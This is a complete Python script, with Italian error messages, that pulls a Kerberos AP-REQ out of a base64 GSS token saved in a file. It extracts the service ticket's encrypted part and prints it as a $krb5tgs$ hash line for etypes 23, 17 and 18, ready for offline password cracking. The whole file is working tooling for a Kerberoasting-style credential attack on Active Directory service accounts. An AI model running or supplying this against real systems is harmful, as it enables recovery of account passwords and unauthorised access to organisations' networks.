#!/usr/bin/env python3
import sys, re, base64
from pyasn1.codec.der import decoder
from impacket.krb5.asn1 import AP_REQ

def find_blob(filepath):
    with open(filepath) as f:
        text = f.read()
    candidates = re.findall(r'[A-Za-z0-9+/=]{500,}', text)
    if not candidates:
        raise ValueError("Nessun blob base64 trovato nel file")
    return max(candidates, key=len)

def extract_ap_req(blob):
    oid = bytes.fromhex('06092a864886f712010202')
    idx = blob.find(oid)
    if idx == -1:
        raise ValueError("OID Kerberos non trovato nel token GSS")
    return blob[idx + len(oid) + 2:]

def main(spn, user, realm, filepath):
    b64blob = find_blob(filepath)
    raw = base64.b64decode(b64blob)
    apreq_bytes = extract_ap_req(raw)
    ap_req, _ = decoder.decode(apreq_bytes, asn1Spec=AP_REQ())
    enc_part = ap_req['ticket']['enc-part']
    etype = int(enc_part['etype'])
    cipher_hex = bytes(enc_part['cipher']).hex()

    if etype in (17, 18):
        checksum, edata = cipher_hex[-24:], cipher_hex[:-24]
        print(f"$krb5tgs${etype}${user}${realm}$*{spn}*${checksum}${edata}")
    elif etype == 23:
        checksum, edata = cipher_hex[:32], cipher_hex[32:]
        print(f"$krb5tgs$23$*{user}${realm}${spn}*${checksum}${edata}")
    else:
        print(f"etype {etype} non gestito", file=sys.stderr)

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])